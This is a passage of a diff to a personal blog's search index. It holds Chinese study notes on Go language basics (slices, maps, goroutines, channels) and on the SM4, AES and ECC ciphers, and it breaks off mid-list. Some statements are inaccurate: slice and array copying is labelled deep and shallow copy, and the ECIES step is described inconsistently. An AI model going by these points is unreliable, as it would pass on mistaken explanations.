-<h2 id="5-iota："><a href="#5-iota：" class="headerlink" title="5.iota："></a>5.iota：</h2><p>与const来表示枚举类型:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const (</span><br><span class="line">a=10*iota</span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-
-<h2 id="6-多返回值"><a href="#6-多返回值" class="headerlink" title="6.多返回值:"></a>6.多返回值:</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">mailres</span><span class="params">(a <span class="type">int</span>)</span></span>(<span class="type">int</span>,<span class="type">int</span>)&#123;</span><br><span class="line">	<span class="keyword">var</span>(</span><br><span class="line">	b=a*<span class="number">2</span></span><br><span class="line">	c=a*<span class="number">3</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">return</span> b,c</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="const分析"><a href="#const分析" class="headerlink" title="const分析:"></a>const分析:</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">Go 中的 <span class="keyword">const</span> 是“编译期常量”，意味着它的值在编译阶段必须 完全确定，不能依赖运行时信息。</span><br><span class="line">不能和任何变量相用</span><br></pre></td></tr></table></figure>
-
-<h2 id="7-go模块化"><a href="#7-go模块化" class="headerlink" title="7.go模块化:"></a>7.go模块化:</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">初始化mod；</span><br><span class="line">module go_project</span><br><span class="line"><span class="keyword">go</span> <span class="number">1.24</span><span class="number">.2</span></span><br><span class="line">这一步会生成 <span class="keyword">go</span>.mod 文件，告诉 Go：</span><br><span class="line">我这个项目的模块名是 go_project，你以后从 go_project/lib1 导入时，就从当前目录找。</span><br><span class="line">/go_project/</span><br><span class="line">├── <span class="keyword">go</span>.mod</span><br><span class="line">├── main.<span class="keyword">go</span></span><br><span class="line">└── lib1/</span><br><span class="line">    └── lib1.<span class="keyword">go</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>方式</th>
-<th>示例代码</th>
-<th>含义</th>
-<th>特点</th>
-<th>使用说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>匿名导入</strong></td>
-<td><code>import _ &quot;fmt&quot;</code></td>
-<td>给包起名为 <code>_</code>（匿名）</td>
-<td>❌ 无法使用包里的函数 ✅ 会执行包的 <code>init()</code> 方法</td>
-<td>常用于只需要执行包初始化逻辑，但不直接使用其函数，例如：注册驱动 <code>import _ &quot;github.com/lib/pq&quot;</code></td>
-</tr>
-<tr>
-<td><strong>别名导入</strong></td>
-<td><code>import aa &quot;fmt&quot;</code></td>
-<td>给 <code>fmt</code> 包起别名 <code>aa</code></td>
-<td>✅ 使用时需写 <code>aa.Println()</code> 等</td>
-<td>适用于避免多个包冲突，或希望起更简洁的名称</td>
-</tr>
-<tr>
-<td><strong>点导入</strong></td>
-<td><code>import . &quot;fmt&quot;</code></td>
-<td>将 <code>fmt</code> 包的方法直接导入到当前作用域</td>
-<td>✅ 可以直接写 <code>Println()</code> 而不是 <code>fmt.Println()</code></td>
-<td>不推荐频繁使用，容易造成命名混淆，常见于测试或临时场景</td>
-</tr>
-</tbody></table>
-<h2 id="8-defer的使用"><a href="#8-defer的使用" class="headerlink" title="8.defer的使用:"></a>8.defer的使用:</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span>之后的语句先执⾏，<span class="keyword">defer</span>后的语句后执⾏</span><br><span class="line">       --<span class="keyword">defer</span> 后会直接压入栈底</span><br></pre></td></tr></table></figure>
-
-<h2 id="9-数组"><a href="#9-数组" class="headerlink" title="9.数组:"></a>9.数组:</h2><h3 id="1静态数组"><a href="#1静态数组" class="headerlink" title="1静态数组:"></a>1静态数组:</h3><h4 id="声明方式-1"><a href="#声明方式-1" class="headerlink" title="声明方式:"></a>声明方式:</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myA [<span class="number">10</span>]<span class="type">int</span></span><br><span class="line">myB:=[<span class="number">10</span>]<span class="type">int</span>&#123;&#125;     --&#123;&#125;可加可不加</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">pr</span><span class="params">(arr [10]<span class="type">int</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">//这样是浅拷贝，不会影响原值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-动态数组"><a href="#2-动态数组" class="headerlink" title="2.动态数组:"></a>2.动态数组:</h3><h4 id="声明方式-2"><a href="#声明方式-2" class="headerlink" title="声明方式:"></a>声明方式:</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 声明 slice1 是一个切片，并且初始化，默认值是 1, 2, 3。长度 len 是 3</span></span><br><span class="line">slice1 := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明 slice1 是一个切片，但是并没有给 slice 分配空间</span></span><br><span class="line"><span class="keyword">var</span> slice1 []<span class="type">int</span></span><br><span class="line">slice1 = <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">3</span>)  <span class="comment">// 开辟 3 个空间，默认值是 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明 slice1 是一个切片，同时给 slice 分配空间，3 个空间，初始化值是 0</span></span><br><span class="line"><span class="keyword">var</span> slice1 []<span class="type">int</span> = <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明 slice1 是一个切片，同时给 slice 分配空间，3 个空间，初始化值是 0，</span></span><br><span class="line"><span class="comment">// 通过 := 推导出 slice 是一个切片</span></span><br><span class="line">slice1 := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">pr</span><span class="params">(arr []<span class="type">int</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">//这样是深拷贝，会影响原值，传递的是指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="append增加"><a href="#append增加" class="headerlink" title="append增加:"></a>append增加:</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">当动态数组通过</span><br><span class="line">         --myA=<span class="built_in">append</span>(myA,<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line"> <span class="built_in">cap</span>:容量会扩大两倍</span><br><span class="line"> 但是<span class="built_in">len</span>:只会增加<span class="number">2</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="3-截取操作"><a href="#3-截取操作" class="headerlink" title="3.截取操作:"></a>3.截取操作:</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">newSlice := oldSlice[start:end]</span><br><span class="line">            start：起始下标（包含）</span><br><span class="line">            end：结束下标（不包含）</span><br><span class="line">            结果长度：end - start</span><br><span class="line">但是<span class="built_in">cap</span>：容量和原切片一致</span><br></pre></td></tr></table></figure>
-
-<h2 id="10-map-键值对类似字典"><a href="#10-map-键值对类似字典" class="headerlink" title="10.map(键值对类似字典):"></a>10.map(键值对类似字典):</h2><h3 id="1-声明方式"><a href="#1-声明方式" class="headerlink" title="1.声明方式:"></a>1.声明方式:</h3><table>
-<thead>
-<tr>
-<th>声明方式</th>
-<th>示例代码</th>
-<th>是否需要 <code>make</code></th>
-<th>是否支持立即赋值</th>
-<th>常用场景</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>var + make</code></td>
-<td><code>var m map[string]string&lt;br&gt;m = make(map[string]string)&lt;br&gt;m[&quot;key&quot;] = &quot;value&quot;</code></td>
-<td>✅ 是</td>
-<td>❌ 否</td>
-<td>全局变量，需延后初始化</td>
-</tr>
-<tr>
-<td><code>:= + make</code></td>
-<td><code>m := make(map[int]string)&lt;br&gt;m[1] = &quot;value&quot;</code></td>
-<td>✅ 是</td>
-<td>❌ 否</td>
-<td>局部变量，简洁初始化</td>
-</tr>
-<tr>
-<td>字面量初始化</td>
-<td><code>m := map[string]string&#123;&lt;br&gt;  &quot;k1&quot;: &quot;v1&quot;,&lt;br&gt;  &quot;k2&quot;: &quot;v2&quot;,&lt;br&gt;&#125;</code></td>
-<td>❌ 否</td>
-<td>✅ 是</td>
-<td>已知数据时快速初始化</td>
-</tr>
-</tbody></table>
-<h2 id="11-面向对象"><a href="#11-面向对象" class="headerlink" title="11.面向对象"></a>11.面向对象</h2><p>Go 语言不是典型的面向对象语言，但它通过 <strong>结构体 + 接口</strong> 实现了封装、继承和多态的能力。</p>
-<table>
-<thead>
-<tr>
-<th>特性</th>
-<th>Go实现方式</th>
-<th>示例</th>
-<th>特点</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>封装</td>
-<td>字段&#x2F;方法首字母大写表示<strong>公开</strong>，小写表示<strong>私有</strong></td>
-<td><code>Name string</code> vs <code>name string</code></td>
-<td>访问控制基于大小写</td>
-</tr>
-<tr>
-<td>继承</td>
-<td><strong>通过组合（Embedding）结构体</strong>实现“继承”</td>
-<td><code>type Student struct &#123; Human &#125;</code></td>
-<td>没有 <code>extends</code>，但有字段&#x2F;方法提升</td>
-</tr>
-<tr>
-<td>多态</td>
-<td><strong>通过接口 interface</strong> 实现</td>
-<td><code>type Speaker interface &#123; Speak() &#125;</code></td>
-<td>接口隐式实现，无需关键字</td>
-</tr>
-</tbody></table>
-<h2 id="12-结构体标签"><a href="#12-结构体标签" class="headerlink" title="12.结构体标签:"></a>12.结构体标签:</h2><p>在 Go 语言中，<strong>结构体标签（Tag）</strong> 是给结构体字段添加额外元信息的一种方式，最常见的应用场景是用于 <strong>JSON 编解码、数据库ORM映射、验证器等</strong>。</p>
-<table>
-<thead>
-<tr>
-<th>项目</th>
-<th>示例</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>语法格式</td>
-<td><code>字段名 类型 </code>标签名:”值”<code> </code></td>
-<td>标签必须用反引号 <code> </code> <code> </code> &#96;</td>
-</tr>
-<tr>
-<td>JSON 标签</td>
-<td><code>json:&quot;name&quot;</code></td>
-<td>用于控制字段序列化时的名称</td>
-</tr>
-<tr>
-<td>多标签</td>
-<td><code>json:&quot;name&quot; db:&quot;user_name&quot;</code></td>
-<td>多个标签中间用空格分隔</td>
-</tr>
-<tr>
-<td>忽略字段</td>
-<td><code>json:&quot;-&quot;</code></td>
-<td>被 <code>-</code> 忽略，不参与序列化</td>
-</tr>
-<tr>
-<td>结构体字段首字母必须大写</td>
-<td><code>Name string</code></td>
-<td>小写字段无法导出，标签也无效</td>
-</tr>
-</tbody></table>
-<h3 id="标签的用途"><a href="#标签的用途" class="headerlink" title="标签的用途"></a>标签的用途</h3><table>
-<thead>
-<tr>
-<th>用途</th>
-<th>标签示例</th>
-<th>第三方库</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>JSON</td>
-<td><code>json:&quot;name&quot;</code></td>
-<td><code>encoding/json</code></td>
-</tr>
-<tr>
-<td>数据库ORM</td>
-<td><code>gorm:&quot;column:user_name&quot;</code></td>
-<td><code>gorm</code></td>
-</tr>
-<tr>
-<td>表单验证</td>
-<td><code>validate:&quot;required&quot;</code></td>
-<td><code>go-playground/validator</code></td>
-</tr>
-<tr>
-<td>配置解析</td>
-<td><code>yaml:&quot;port&quot;</code></td>
-<td><code>gopkg.in/yaml.v2</code></td>
-</tr>
-<tr>
-<td>结构体比较</td>
-<td><code>cmp:&quot;ignore&quot;</code></td>
-<td><code>github.com/google/go-cmp</code></td>
-</tr>
-</tbody></table>
-<h2 id="13-go协程-goroutine"><a href="#13-go协程-goroutine" class="headerlink" title="13.go协程(goroutine):"></a>13.go协程(goroutine):</h2><h3 id="1-基础用法"><a href="#1-基础用法" class="headerlink" title="1.基础用法:"></a>1.基础用法:</h3><table>
-<thead>
-<tr>
-<th>用法场景</th>
-<th>语法</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>启动协程</td>
-<td><code>go 函数名()</code></td>
-<td><code>go doWork()</code></td>
-</tr>
-<tr>
-<td>匿名函数协程</td>
-<td><code>go func()&#123;...&#125;()</code></td>
-<td><code>go func()&#123; fmt.Println(&quot;Hi&quot;) &#125;()</code></td>
-</tr>
-<tr>
-<td>协程同步</td>
-<td><code>sync.WaitGroup</code></td>
-<td>用于等待所有协程完成</td>
-</tr>
-<tr>
-<td>协程通信</td>
-<td><code>chan</code> 通道</td>
-<td><code>ch := make(chan int)</code>，用于发送&#x2F;接收数据</td>
-</tr>
-<tr>
-<td>协程超时</td>
-<td><code>select + time.After</code></td>
-<td>处理阻塞操作的超时控制</td>
-</tr>
-</tbody></table>
-<h3 id="2-注意事项"><a href="#2-注意事项" class="headerlink" title="2.注意事项:"></a>2.注意事项:</h3><table>
-<thead>
-<tr>
-<th>注意点</th>
-<th>原因</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>不要在 goroutine 中访问共享变量（需加锁或使用 channel）</td>
-<td>避免数据竞争（data race）</td>
-</tr>
-<tr>
-<td>主程序要等待协程完成，否则程序会提前退出</td>
-<td>使用 <code>sync.WaitGroup</code></td>
-</tr>
-<tr>
-<td>不要忘记 <code>wg.Done()</code>，否则会死锁</td>
-<td><code>wg.Wait()</code> 永远不会结束</td>
-</tr>
-<tr>
-<td>大量协程可用 <code>GOMAXPROCS</code> 控制核心数</td>
-<td><code>runtime.GOMAXPROCS(n)</code></td>
-</tr>
-</tbody></table>
-<h2 id="14管道-channel"><a href="#14管道-channel" class="headerlink" title="14管道(channel):"></a>14管道(channel):</h2><h3 id="1-基本使用"><a href="#1-基本使用" class="headerlink" title="1.基本使用:"></a>1.基本使用:</h3><table>
-<thead>
-<tr>
-<th>概念</th>
-<th>说明</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>创建通道</td>
-<td>用 <code>make(chan 类型)</code> 创建</td>
-<td><code>ch := make(chan int)</code></td>
-</tr>
-<tr>
-<td>发送数据</td>
-<td>使用 <code>&lt;-</code> 向通道发送值</td>
-<td><code>ch &lt;- 10</code></td>
-</tr>
-<tr>
-<td>接收数据</td>
-<td>从通道中读取值</td>
-<td><code>val := &lt;-ch</code></td>
-</tr>
-<tr>
-<td>无缓冲通道</td>
-<td>发送时必须等待接收方</td>
-<td><code>ch := make(chan int)</code></td>
-</tr>
-<tr>
-<td>有缓冲通道</td>
-<td>可存储一定数量数据</td>
-<td><code>ch := make(chan int, 3)</code></td>
-</tr>
-<tr>
-<td>关闭通道</td>
-<td>表示不会再发送数据</td>
-<td><code>close(ch)</code></td>
-</tr>
-<tr>
-<td><code>for range</code> 读取</td>
-<td>读取所有通道数据直到关闭</td>
-<td><code>for v := range ch &#123;...&#125;</code></td>
-</tr>
-</tbody></table>
-<h3 id="2-与select使用"><a href="#2-与select使用" class="headerlink" title="2.与select使用:"></a>2.与select使用:</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">done通道可以看作一个空结构体，不占用内存<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>使用模式</th>
-<th>示例代码片段</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>接收多个通道数据</td>
-<td><code>select &#123; case v := &lt;-ch1: ... case v := &lt;-ch2: ... &#125;</code></td>
-<td>等待多个输入，哪个先来就处理哪个</td>
-</tr>
-<tr>
-<td>超时控制</td>
-<td><code>select &#123; case &lt;-ch: ... case &lt;-time.After(t): ... &#125;</code></td>
-<td>避免 goroutine 永远阻塞</td>
-</tr>
-<tr>
-<td>退出信号监听</td>
-<td><code>select &#123; case &lt;-data: ... case &lt;-done: return &#125;</code></td>
-<td>通过 <code>done</code> 通道优雅退出</td>
-</tr>
-<tr>
-<td>非阻塞 send&#x2F;recv</td>
-<td><code>select &#123; case ch &lt;- val: ... default: ... &#125;</code></td>
-<td>如果通道阻塞就执行 default</td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>golang</category>
-      </categories>
-      <tags>
-        <tag>语言学习</tag>
-        <tag>golang</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/2025/09/17/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81(%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81)/sm4/</url>
-    <content><![CDATA[<h1 id="sm4加密"><a href="#sm4加密" class="headerlink" title="sm4加密:"></a>sm4加密:</h1><h2 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念:"></a>1.概念:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SM4是一种分组密码算法，其分组长度为128位（即16字节，4字），密钥长度也为128位（即16字节，4字）。其加解密过程采用了32轮迭代机制（与DES、AES类似），每一轮需要一个轮密钥（与DES、AES类似）。</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-加密流程"><a href="#2-加密流程" class="headerlink" title="2.加密流程:"></a>2.加密流程:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：128 位明文 + 128 位密钥</span><br><span class="line">↓</span><br><span class="line">1. 明文拆成 4 个 32 位字：X0, X1, X2, X3</span><br><span class="line">2. 密钥扩展：生成 32 个轮密钥 rk[0] ~ rk[31]</span><br><span class="line">3. 执行 32 轮加密：</span><br><span class="line">     对于每一轮 i = 0 到 31：</span><br><span class="line">         X[i+4] = X[i] ⊕ F(X[i+1], X[i+2], X[i+3], rk[i])</span><br><span class="line">4. 输出密文：X[35], X[34], X[33], X[32]（倒序输出）</span><br></pre></td></tr></table></figure>
-
-<h2 id="3-F函数"><a href="#3-F函数" class="headerlink" title="3.F函数:"></a>3.F函数:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">F(X1, X2, X3, rk) = T(X1 ⊕ X2 ⊕ X3 ⊕ rk)</span><br><span class="line">输入：X1, X2, X3, rk</span><br><span class="line"></span><br><span class="line">Step 1:  temp = X1 ⊕ X2 ⊕ X3 ⊕ rk   → 32位</span><br><span class="line">Step 2:  替代 temp 的每个字节 → 使用 S-box → 得到非线性结果</span><br><span class="line">Step 3:  对结果进行线性变换 L(x)</span><br><span class="line">Step 4:  输出最终的 F 值（32 位）</span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>功能类型</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>混淆性</strong>（Confusion）</td>
-<td>通过 S-box 实现非线性映射，防止线性分析</td>
-</tr>
-<tr>
-<td><strong>扩散性</strong>（Diffusion）</td>
-<td>L 线性变换使得一个比特变化影响多个比特</td>
-</tr>
-<tr>
-<td><strong>密钥注入</strong></td>
-<td>引入轮密钥 rk[i]，确保每轮变换唯一</td>
-</tr>
-<tr>
-<td><strong>加密推进器</strong></td>
-<td>每轮根据 F 生成新状态字，实现 128 位数据演化</td>
-</tr>
-</tbody></table>
-]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/2025/09/17/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81(%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81)/aes/</url>
-    <content><![CDATA[<h1 id="aes加密"><a href="#aes加密" class="headerlink" title="aes加密:"></a>aes加密:</h1><h2 id="1-特征"><a href="#1-特征" class="headerlink" title="1.特征:"></a>1.特征:</h2><table>
-<thead>
-<tr>
-<th>属性</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>分组大小（Block）</td>
-<td>固定为 <strong>128 位</strong>（16 字节）</td>
-</tr>
-<tr>
-<td>密钥长度（Key）</td>
-<td>可为 <strong>128 位 &#x2F; 192 位 &#x2F; 256 位</strong>（常用128位）</td>
-</tr>
-<tr>
-<td>轮数（Rounds）</td>
-<td>依据密钥长度不同：10（128位）、12（192）、14（256）</td>
-</tr>
-<tr>
-<td>算法结构</td>
-<td>基于 <strong>Substitution–Permutation Network（SPN）</strong></td>
-</tr>
-</tbody></table>
-<h2 id="2-aes的加密流程-密钥128位"><a href="#2-aes的加密流程-密钥128位" class="headerlink" title="2.aes的加密流程 (密钥128位):"></a>2.aes的加密流程 (密钥128位):</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入明文（128bit）</span><br><span class="line">      ↓</span><br><span class="line">AddRoundKey（初始轮）</span><br><span class="line">      ↓</span><br><span class="line">9轮：SubBytes(字节代换) → ShiftRows(行移位) → MixColumns(列混合) → AddRoundKey (轮密钥加)</span><br><span class="line">      ↓</span><br><span class="line">第10轮：SubBytes → ShiftRows → AddRoundKey    ---没有列混合</span><br><span class="line">      ↓</span><br><span class="line">输出密文（128bit）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>3.初始轮:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将明文状态矩阵与第 0 轮子密钥（RoundKey₀）做逐字节异或（XOR）操作。</span><br><span class="line">本质上是将密钥“注入”到加密流程的起点，为接下来的非线性变换和扩散做准备。</span><br></pre></td></tr></table></figure>
-
-<h3 id="1-问题"><a href="#1-问题" class="headerlink" title="1.问题:"></a>1.问题:</h3><p>明文是 128 位（16 字节），初始轮的 AddRoundKey 是对明文和密钥逐字节 XOR。如果我的密钥是 <strong>192 位或 256 位</strong>，那怎么 XOR 呢？</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AES 不直接使用原始密钥参与加密，而是通过 密钥扩展（Key Schedule） 生成 每轮使用的“轮密钥”（Round Key）。不管原始密钥是 128、192 还是 256 位，每轮都只用一个 128 位的轮密钥。</span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>原始密钥位数</th>
-<th>总轮数</th>
-<th>要生成的子密钥数量</th>
-<th>每个子密钥长度</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>128 位</td>
-<td>10</td>
-<td>11 个</td>
-<td>128 位（16 字节）</td>
-</tr>
-<tr>
-<td>192 位</td>
-<td>12</td>
-<td>13 个</td>
-<td>128 位</td>
-</tr>
-<tr>
-<td>256 位</td>
-<td>14</td>
-<td>15 个</td>
-<td>128 位</td>
-</tr>
-</tbody></table>
-<h2 id="4-字节替代-s盒"><a href="#4-字节替代-s盒" class="headerlink" title="4.字节替代(s盒):"></a>4.字节替代(s盒):</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对 状态矩阵中的每个字节，使用一个固定的查找表（S-box）进行非线性映射替代</span><br><span class="line">是整个 AES 中引入非线性和抗线性分析攻击的核心步骤</span><br><span class="line">就是按字节查表:</span><br><span class="line">   比如某一个字节是0x53</span><br><span class="line">        高4位：5（行索引）</span><br><span class="line">        低4位：3（列索引）</span><br><span class="line">   然后去s盒表中找5行3列对应的字节值</span><br></pre></td></tr></table></figure>
-
-<h2 id="5-行移位"><a href="#5-行移位" class="headerlink" title="5.行移位:"></a>5.行移位:</h2><p>按行左移字节就行了</p>
-<table>
-<thead>
-<tr>
-<th>行号</th>
-<th>操作</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>第0行</td>
-<td>不变</td>
-</tr>
-<tr>
-<td>第1行</td>
-<td>循环左移 1 个字节</td>
-</tr>
-<tr>
-<td>第2行</td>
-<td>循环左移 2 个字节</td>
-</tr>
-<tr>
-<td>第3行</td>
-<td>循环左移 3 个字节（或右移1位）</td>
-</tr>
-</tbody></table>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">打乱同一列字节之间的联系，让后续的 MixColumns 可以混合更多跨字节的数据；</span><br><span class="line">增强扩散性，使得明文的小改动能影响到加密后的多个字节；</span><br><span class="line">是一种 位置置换操作，没有改变字节本身的值。</span><br></pre></td></tr></table></figure>
-
-<h2 id="6-列混合"><a href="#6-列混合" class="headerlink" title="6.列混合:"></a>6.列混合:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MixColumns（列混合） 是 AES 加密中每一轮的第 3 个操作（除了最后一轮不执行它），</span><br><span class="line">它通过矩阵乘法在 GF(2⁸) 有限域中，把每一列的4个字节混合生成新的4个字节。</span><br></pre></td></tr></table></figure>
-
-<h2 id="7-轮密钥加"><a href="#7-轮密钥加" class="headerlink" title="7.轮密钥加:"></a>7.轮密钥加:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当前状态矩阵与本轮的轮密钥（Round Key）逐字节进行按位异或（XOR）</span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>特性</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>运算简单</td>
-<td>仅使用按位异或（XOR），硬件友好</td>
-</tr>
-<tr>
-<td>密钥注入点</td>
-<td>是 AES 中 <strong>唯一使用密钥的地方</strong></td>
-</tr>
-<tr>
-<td>可逆性强</td>
-<td>XOR 的逆运算就是本身（再次 XOR 即可还原）</td>
-</tr>
-<tr>
-<td>轮密钥变化</td>
-<td>每轮使用不同的轮密钥（由原始密钥扩展）</td>
-</tr>
-</tbody></table>
-<h2 id="8-密钥扩展"><a href="#8-密钥扩展" class="headerlink" title="8.密钥扩展:"></a>8.密钥扩展:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将原始密钥切成若干 32 位字（4字/6字/8字）</span><br><span class="line">每次迭代扩展一个 32 位字，共需 44/52/60 个字（每轮 4 个字）</span><br><span class="line"></span><br><span class="line">1. 初始密钥写入前 Nk 个字（Nk = 4/6/8）</span><br><span class="line">2. 对后续每一组（每组4字）：</span><br><span class="line">   - 如果当前索引 i 是 Nk 的倍数：</span><br><span class="line">     temp = SubWord(RotWord(w[i-1])) ⊕ Rcon[i/Nk]</span><br><span class="line">   - 否则如果 Nk &gt; 6 且 i ≡ 4 mod Nk：</span><br><span class="line">     temp = SubWord(w[i-1])</span><br><span class="line">   - 然后：w[i] = w[i-Nk] ⊕ temp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>项目</th>
-<th>AES</th>
-<th>DES</th>
-<th>SM4</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>原始密钥长度</td>
-<td>128 &#x2F; 192 &#x2F; 256 bit</td>
-<td>64 bit（含8位校验）</td>
-<td>128 bit</td>
-</tr>
-<tr>
-<td>有效密钥长度</td>
-<td>128 &#x2F; 192 &#x2F; 256 bit</td>
-<td>56 bit</td>
-<td>128 bit</td>
-</tr>
-<tr>
-<td>总轮数</td>
-<td>10 &#x2F; 12 &#x2F; 14</td>
-<td>16</td>
-<td>32</td>
-</tr>
-<tr>
-<td>每轮密钥长度</td>
-<td>128 bit（16 字节）</td>
-<td>48 bit</td>
-<td>32 bit（1个字）</td>
-</tr>
-<tr>
-<td>子密钥数量</td>
-<td>轮数 + 1（11&#x2F;13&#x2F;15 个）</td>
-<td>16 个</td>
-<td>32 个</td>
-</tr>
-<tr>
-<td>主要操作</td>
-<td>字扩展 + S-box + XOR + 轮常量</td>
-<td>置换 + 左移 + 压缩置换</td>
-<td>XOR + S-box + 线性变换 + CK</td>
-</tr>
-<tr>
-<td>是否非线性</td>
-<td>✅（使用 S-box）</td>
-<td>❌</td>
-<td>✅（S-box + 线性组合）</td>
-</tr>
-<tr>
-<td>是否可逆</td>
-<td>❌</td>
-<td>✅</td>
-<td>❌（但结构对称）</td>
-</tr>
-</tbody></table>
-]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/2025/09/17/%E5%AF%86%E7%A0%81%E5%AD%A6/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81(%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81)/%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%AF%86%E7%A0%81/</url>
-    <content><![CDATA[<h1 id="椭圆曲线密码-ECC"><a href="#椭圆曲线密码-ECC" class="headerlink" title="椭圆曲线密码(ECC):"></a>椭圆曲线密码(ECC):</h1><p>基于椭圆曲线离散对数问题（ECDLP）难解性</p>
-<h2 id="1-密钥的生成"><a href="#1-密钥的生成" class="headerlink" title="1. 密钥的生成:"></a>1. 密钥的生成:</h2><p>在椭圆曲线加密中，密钥生成包括两部分：<strong>私钥</strong>和<strong>公钥</strong>。</p>
-<ul>
-<li><p><strong>私钥</strong>：随机选择一个大整数，通常通过一个安全的随机数生成器来生成。</p>
-</li>
-<li><p><strong>公钥</strong>：通过私钥和椭圆曲线的基点（生成点）进行运算生成。公钥是私钥与基点的乘积，记作：</p>
-<p>Public Key&#x3D;Private Key×G</p>
-<p>其中 G 是椭圆曲线的基点。</p>
-</li>
-</ul>
-<h2 id="2-加密流程"><a href="#2-加密流程" class="headerlink" title="2.加密流程:"></a>2.加密流程:</h2><p>椭圆曲线集成加密方案（ECIES，Elliptic Curve Integrated Encryption Scheme）是一种使用椭圆曲线加密的标准方法，下面是ECIES的加密流程：</p>
-<h4 id="加密方："><a href="#加密方：" class="headerlink" title="加密方："></a>加密方：</h4><ol>
-<li><p><strong>选择公钥</strong>：接收方（Bob）将其公钥提供给发送方（Alice）。</p>
-</li>
-<li><p><strong>生成随机数</strong>：发送方随机选择一个整数 k，该整数与椭圆曲线基点 G 结合来生成加密密钥。</p>
-</li>
-<li><p><strong>计算共享密钥</strong>：发送方使用自己的私钥和接收方的公钥，计算共享密钥（共享密钥的计算基于椭圆曲线Diffie-Hellman协议）：</p>
-<p>K&#x3D;k×Bob’s Public Key     —Bob’s Public Key&#x3D;Bob的私钥×G</p>
-</li>
